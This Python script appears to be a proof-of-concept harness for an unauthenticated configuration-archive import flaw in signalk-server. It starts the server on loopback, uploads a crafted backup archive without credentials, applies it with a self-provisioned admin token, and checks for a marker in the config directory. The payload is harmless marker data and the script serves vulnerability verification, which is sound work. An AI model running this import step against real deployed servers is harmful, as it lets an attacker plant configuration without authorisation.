#!/usr/bin/env python3
"""PoC driver: unauthenticated configuration-archive import in signalk-server.

Starts the target binary as a child process (loopback only, controlled env),
probes its HTTP interface, uploads an attacker-supplied configuration archive
to the backup-validation/import endpoint WITHOUT any credentials, then asks the
restore (apply) endpoint -- authenticated with a session token obtained through
the service's own login endpoint using the ADMINUSER credentials this script
provisioned at startup -- to copy the imported archive's files into the
server's runtime configuration storage directory.

Everything sent over the wire is constructed at runtime. The result is reported
in a fixed JSON contract; the service rejecting any step is a legitimate
outcome, not an error.
"""

import argparse
import io
import json
import os
import re
import shutil
import signal
import socket
import subprocess
import sys
import tempfile
import time
import traceback
import uuid
import zipfile

HOST = "127.0.0.1"
DEFAULT_TIMEOUT = 90
LOG_TAIL_CHARS = 4000
OUTPUT_TAIL_CHARS = 8000
MARKER_PREFIX = "SK-POC-MARKER-"

# Candidate REST prefixes probed at runtime (the live one is discovered).
ROUTE_PREFIX_CANDIDATES = ["/skServer"]
# Candidate login endpoints probed at runtime.
LOGIN_CANDIDATES = ["/login", "/signalk/v1/auth/login"]
# Candidate import (configuration archive upload) endpoints.
IMPORT_CANDIDATES = [
    "/validateBackup",
    "/restore",
    "/backup",
]
# Candidate apply (configuration apply) endpoints.
APPLY_CANDIDATES = ["/restore"]


# --------------------------------------------------------------------------
# small stdlib HTTP client (loopback only)
# --------------------------------------------------------------------------

class Response(object):
    def __init__(self, status, headers, body):
        self.status = status
        self.headers = headers
        self.body = body

    @property
    def text(self):
        try:
            return self.body.decode("utf-8", "replace")
        except Exception:
            return repr(self.body)

    def header(self, name, default=None):
        lname = name.lower()
        for k, v in self.headers.items():
            if k.lower() == lname:
                return v
        return default


def http_request(port, method, path, body=None, headers=None, timeout=15):
    """Issue a single HTTP/1.1 request over a raw socket; never raises."""
    hdrs = dict(headers or {})
    if isinstance(body, str):
        body = body.encode("utf-8")
    if body is not None and "Content-Type" not in {k.title() for k in hdrs}:
        hdrs.setdefault("Content-Type", "application/json")
    hdrs.setdefault("Host", "%s:%d" % (HOST, port))
    hdrs.setdefault("Content-Length", str(len(body) if body is not None else 0))
    hdrs.setdefault("Connection", "close")
    req = "%s %s HTTP/1.1\r\n" % (method, path)
    for k, v in hdrs.items():
        req += "%s: %s\r\n" % (k, v)
    req += "\r\n"
    raw = req.encode("utf-8") + (body or b"")

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((HOST, port))
        sock.sendall(raw)
        chunks = []
        while True:
            try:
                chunk = sock.recv(65536)
            except socket.timeout:
                break
            if not chunk:
                break
            chunks.append(chunk)
            if len(b"".join(chunks)) > 8 * 1024 * 1024:
                break
    except Exception:
        return None
    finally:
        try:
            sock.close()
        except Exception:
            pass

    data = b"".join(chunks)
    if not data:
        return None
    try:
        head, _, payload = data.partition(b"\r\n\r\n")
        lines = head.split(b"\r\n")
        m = re.match(rb"HTTP/\d\.\d\s+(\d+)", lines[0])
        if not m:
            return None
        status = int(m.group(1))
        headers_out = {}
        for line in lines[1:]:
            if b":" in line:
                k, _, v = line.partition(b":")
                headers_out[k.strip().decode("latin-1")] = v.strip().decode("latin-1")
        # Handle chunked transfer encoding minimally.
        if headers_out.get("Transfer-Encoding", "").lower() == "chunked":
            payload = _dechunk(payload)
        return Response(status, headers_out, payload)
    except Exception:
        return None


def _dechunk(payload):
    out = b""
    rest = payload
    while True:
        sep = rest.find(b"\r\n")
        if sep < 0:
            break
        try:
            size = int(rest[:sep].split(b";")[0].strip(), 16)
        except Exception:
            break
        if size == 0:
            break
        out += rest[sep + 2:sep + 2 + size]
        rest = rest[sep + 2 + size:]
        if rest.startswith(b"\r\n"):
            rest = rest[2:]
    if not out:
        out = payload
    return out


# --------------------------------------------------------------------------
# runtime-constructed trigger payload
# --------------------------------------------------------------------------

def build_backup_archive(port, marker):
    """Build the configuration-archive bytes entirely at runtime.

    Returns (archive_bytes, multipart_body_bytes, content_type, filenames).
    """
    settings = {
        "port": port,
        "vessel": {"name": marker, "uuid": "urn:mrn:signalk:uuid:%s" % uuid.uuid4()},
        "pipedProviders": [],
        "interfaces": {},
        "description": marker,
    }
    defaults = {
        "vessels": {"self": {"name": marker}},
        "configuration": {"marker": marker},
    }
    base_deltas = {
        "context": "vessels.self",
        "updates": [{"source": {"label": marker}, "values": [{"path": "", "value": marker}]}],
    }

    members = [
        ("settings.json", json.dumps(settings, indent=2) + "\n"),
        ("defaults.json", json.dumps(defaults, indent=2) + "\n"),
        ("baseDeltas.json", json.dumps(base_deltas, indent=2) + "\n"),
    ]

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, content in members:
            zf.writestr(name, content)
    archive = buf.getvalue()

    boundary = "----SKPoC" + uuid.uuid4().hex
    filename = "signalk-%s.backup" % time.strftime("%b-%d-%Y-%H%M")
    parts = []
    parts.append(
        (
            "--%s\r\n"
            "Content-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n"
            "Content-Type: application/zip\r\n"
            "\r\n" % (boundary, filename)
        ).encode("utf-8")
    )
    parts.append(archive)
    parts.append(("\r\n--%s--\r\n" % boundary).encode("utf-8"))
    body = b"".join(parts)
    content_type = "multipart/form-data; boundary=%s" % boundary
    return archive, body, content_type, [name for name, _ in members]


# --------------------------------------------------------------------------
# helpers
# --------------------------------------------------------------------------

def free_port():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, 0))
    port = s.getsockname()[1]
    s.close()
    return port


def wait_for_service(port, deadline):
    while time.time() < deadline:
        resp = http_request(port, "GET", "/", timeout=5)
        if resp is not None:
            return True
        time.sleep(0.5)
    return False


def json_body(resp):
    if resp is None:
        return None
    try:
        return json.loads(resp.body.decode("utf-8"))
    except Exception:
        return None


def find_json_field(obj, keys):
    """Recursively look for any of `keys` in a nested JSON structure."""
    if isinstance(obj, dict):
        for k, v in obj.items():
            if k in keys and isinstance(v, str) and v:
                return v
            found = find_json_field(v, keys)
            if found:
                return found
    elif isinstance(obj, list):
        for item in obj:
            found = find_json_field(item, keys)
            if found:
                return found
    return None


def discover_prefix(port):
    """Find the REST prefix the live build actually serves."""
    for candidate in ROUTE_PREFIX_CANDIDATES:
        resp = http_request(port, "GET", candidate + "/loginStatus", timeout=8)
        if resp is not None and resp.status in (200, 401, 403):
            data = json_body(resp)
            if isinstance(data, dict) and any(
                k in data for k in ("status", "securityWasEnabled", "authenticationRequired")
            ):
                return candidate
    # Fallback: probe the paths directly at root.
    return ""


def discover_login_endpoint(port):
    for candidate in LOGIN_CANDIDATES:
        resp = http_request(port, "POST", candidate, body="{}", timeout=8)
        if resp is not None and resp.status in (200, 400, 401):
            return candidate
    return "/login"


def do_login(port, login_path, username, password):
    payload = json.dumps({"username": username, "password": password}).encode("utf-8")
    resp = http_request(
        port,
        "POST",
        login_path,
        body=payload,
        headers={"Content-Type": "application/json"},
        timeout=15,
    )
    if resp is None:
        return None, None
    token = None
    data = json_body(resp)
    if isinstance(data, dict):
        token = find_json_field(data, ("token", "jwt", "access_token", "session"))
    if token is None:
        cookie = resp.header("Set-Cookie", "")
        m = re.search(r"(?:^|;\s*)([A-Za-z0-9_-]+)=(eyJ[A-Za-z0-9_.-]+)", cookie)
        if m:
            token = m.group(2)
    return resp.status, token


def probe_import_endpoint(port, prefix):
    """Identify the configuration-import (archive upload) request.

    Preference order mirrors the interface description: the archive upload is
    the request that validates/ingests a configuration archive.
    """
    for candidate in IMPORT_CANDIDATES:
        path = prefix + candidate
        resp = http_request(port, "POST", path, body="{}", timeout=8)
        if resp is None:
            continue
        # A route that exists answers with a route-level error (400/500 from
        # the handler); an unknown route answers 404.
        if resp.status != 404:
            return path
    return None


def probe_apply_endpoint(port, prefix):
    for candidate in APPLY_CANDIDATES:
        path = prefix + candidate
        resp = http_request(port, "POST", path, body="{}", timeout=8)
        if resp is None:
            continue
        if resp.status != 404:
            return path
    return None


def scan_config_dir(config_dir, marker):
    """Return (replaced: bool, content: str|None, filename: str|None)."""
    replaced = False
    content = None
    hit_name = None
    for root, _dirs, files in os.walk(config_dir):
        for name in files:
            path = os.path.join(root, name)
            try:
                if os.path.getsize(path) > 4 * 1024 * 1024:
                    continue
                with open(path, "rb") as fh:
                    blob = fh.read()
            except OSError:
                continue
            try:
                text = blob.decode("utf-8")
            except UnicodeDecodeError:
                if marker.encode("utf-8") in blob:
                    replaced = True
                    hit_name = name
                    content = blob.decode("utf-8", "replace")
                continue
            if marker in text:
                replaced = True
                if content is None or len(text) > len(content):
                    content = text
                    hit_name = name
    return replaced, content, hit_name


def tail(text, limit):
    if text is None:
        return ""
    text = text[-limit:]
    return text if isinstance(text, str) else text.decode("utf-8", "replace")


# --------------------------------------------------------------------------
# main driver
# --------------------------------------------------------------------------

def run(binary, timeout):
    started = time.time()
    result = {
        "binary": binary,
        "command": [binary],
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {"kind": "custom", "value": None, "path": None},
        "error": None,
    }

    proc = None
    config_dir = None
    server_log = io.StringIO()
    marker = MARKER_PREFIX + uuid.uuid4().hex

    def finish(timed_out_flag=False):
        elapsed = int((time.time() - started) * 1000)
        result["runtime_ms"] = elapsed
        result["timed_out"] = timed_out_flag
        if timed_out_flag:
            result["error"] = "run exceeded --timeout (%ss)" % timeout
        # Collect child exit status.
        if proc is not None:
            if proc.poll() is None:
                _terminate(proc)
            rc = proc.returncode
            if rc is None:
                rc = 0
            result["returncode"] = rc
            result["signal"] = _signal_name(proc)
        result["stdout"] = tail(server_log.getvalue(), OUTPUT_TAIL_CHARS)
        # Cleanup the scratch config dir we created.
        if config_dir is not None:
            shutil.rmtree(config_dir, ignore_errors=True)
        return result

    # ---- launch -----------------------------------------------------------
    port = free_port()
    username = "pocadmin" + uuid.uuid4().hex[:6]
    password = "Poc!Pass-" + uuid.uuid4().hex[:10]
    config_dir = tempfile.mkdtemp(prefix="sk-poc-cfg-")

    env = os.environ.copy()
    env["PORT"] = str(port)
    env["ADMINUSER"] = "%s:%s" % (username, password)
    env["SIGNALK_NODE_CONFIG_DIR"] = config_dir
    env["NO_COLOR"] = "1"
    # Keep the child away from anything the caller had set that could alter
    # provisioning; the script controls the full environment it needs.
    for var in ("SIGNALK_NODE_SETTINGS", "SIGNALK_NODE_CONDFIG_DIR"):
        env.pop(var, None)

    try:
        proc = subprocess.Popen(
            [binary],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            stdin=subprocess.DEVNULL,
            env=env,
            cwd=os.path.dirname(os.path.abspath(binary)) or ".",
        )
    except Exception as exc:
        result["error"] = "failed to start binary: %s" % exc
        result["stdout"] = traceback.format_exc()
        return finish()

    # Reader thread-style pump: drain the merged child output incrementally so
    # the pipe never fills and we have a log tail.
    deadline = time.time() + timeout
    ready = False
    import threading

    def pump():
        try:
            while True:
                byte = proc.stdout.read(1)
                if not byte:
                    break
                server_log.write(byte.decode("utf-8", "replace"))
        except Exception:
            pass

    reader = threading.Thread(target=pump, daemon=True)
    reader.start()

    # Wait for the TCP service to answer.
    while time.time() < deadline:
        if proc.poll() is not None:
            break
        resp = http_request(port, "GET", "/", timeout=4)
        if resp is not None:
            ready = True
            break
        time.sleep(0.5)

    if not ready:
        # Service never came up: legitimate observation, not an error, unless
        # the child died.
        if proc.poll() is None:
            result["error"] = "service did not become reachable before timeout"
        return finish(timed_out_flag=(proc.poll() is None))

    # ---- probe the interface ---------------------------------------------
    prefix = discover_prefix(port)
    login_path = discover_login_endpoint(port)
    import_path = probe_import_endpoint(port, prefix)
    apply_path = probe_apply_endpoint(port, prefix)

    import_http = None
    apply_http = None
    import_ok = False
    apply_ok = False
    import_response = ""

    # ---- step 1: unauthenticated configuration-archive import ------------
    # No Authorization header, no cookie, no session of any kind. If this is
    # rejected we record it and do NOT retry with credentials.
    if import_path is not None:
        _archive, mp_body, content_type, filenames = build_backup_archive(port, marker)
        resp = http_request(
            port,
            "POST",
            import_path,
            body=mp_body,
            headers={"Content-Type": content_type},
            timeout=30,
        )
        if resp is not None:
            import_http = resp.status
            import_response = resp.text[:500]
            # The archive was accepted for import if the response lists the
            # archive's configuration files (server-side validation output).
            listed = []
            data = json_body(resp)
            if isinstance(data, list):
                listed = [x for x in data if isinstance(x, str)]
            if resp.status == 200 and any(
                name in listed or (name + "/") in listed for name in filenames
            ):
                import_ok = True
        else:
            import_http = 0
    else:
        import_http = -1  # no import route found on this build

    # ---- step 2: authenticated configuration apply -----------------------
    login_http = None
    token = None
    if apply_path is not None:
        login_http, token = do_login(port, login_path, username, password)
        if token:
            payload = {name: True for name in filenames}
            resp = http_request(
                port,
                "POST",
                apply_path,
                body=json.dumps(payload).encode("utf-8"),
                headers={
                    "Content-Type": "application/json",
                    "Authorization": "JWT " + token,
                },
                timeout=30,
            )
            if resp is not None:
                apply_http = resp.status
                apply_ok = 200 <= resp.status < 300
            else:
                apply_http = 0
        else:
            # Without a valid session token the apply request is rejected
            # (HTTP 401). Send it unauthenticated to record the rejection.
            resp = http_request(
                port,
                "POST",
                apply_path,
                body=json.dumps({name: True for name in filenames}).encode("utf-8"),
                headers={"Content-Type": "application/json"},
                timeout=30,
            )
            apply_http = resp.status if resp is not None else 0

    # Give the server a moment to finish copying files asynchronously.
    wait_until = time.time() + 8
    replaced = False
    config_content = None
    while time.time() < wait_until:
        replaced, config_content, _hit = scan_config_dir(config_dir, marker)
        if replaced:
            break
        time.sleep(0.5)

    # ---- assemble the observable -----------------------------------------
    triggered = bool(replaced)
    value = {
        "triggered": triggered,
        "import_http": import_http,
        "apply_http": apply_http,
        "config_replaced": bool(replaced),
        "marker": marker,
        "config_content": config_content,
        "server_log_tail": tail(server_log.getvalue(), LOG_TAIL_CHARS),
        # supplementary context (contract requires the fields above; extra
        # detail about how far the interaction got is included for clarity)
        "import_endpoint": import_path,
        "apply_endpoint": apply_path,
        "login_http": login_http,
        "import_accepted": import_ok,
        "apply_accepted": apply_ok,
        "import_response": import_response,
    }
    result["observable"]["value"] = json.dumps(value)
    return finish()


def _terminate(proc):
    try:
        proc.terminate()
        try:
            proc.wait(timeout=8)
        except subprocess.TimeoutExpired:
            proc.kill()
            try:
                proc.wait(timeout=5)
            except Exception:
                pass
    except Exception:
        pass


def _signal_name(proc):
    rc = proc.returncode
    if rc is not None and rc < 0:
        try:
            return signal.Signals(-rc).name
        except Exception:
            return "SIG%d" % (-rc)
    return None


def main():
    parser = argparse.ArgumentParser(description="signalk-server config import PoC driver")
    parser.add_argument("--binary", required=True, help="path to the target server binary")
    parser.add_argument("--json-out", default=None, help="write the JSON result to this file")
    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT,
                        help="overall per-run budget in seconds (default 90)")
    args = parser.parse_args()

    binary = os.path.abspath(args.binary)
    try:
        result = run(binary, max(5, int(args.timeout)))
    except Exception:
        result = {
            "binary": binary,
            "command": [binary],
            "returncode": None,
            "signal": None,
            "timed_out": False,
            "runtime_ms": 0,
            "stdout": "",
            "stderr": traceback.format_exc()[-OUTPUT_TAIL_CHARS:],
            "observable": {"kind": "custom", "value": None, "path": None},
            "error": "script internal exception",
        }

    text = json.dumps(result, indent=2)
    if args.json_out:
        with open(args.json_out, "w") as fh:
            fh.write(text)
    else:
        sys.stdout.write(text + "\n")
    return 0


if __name__ == "__main__":
    sys.exit(main())
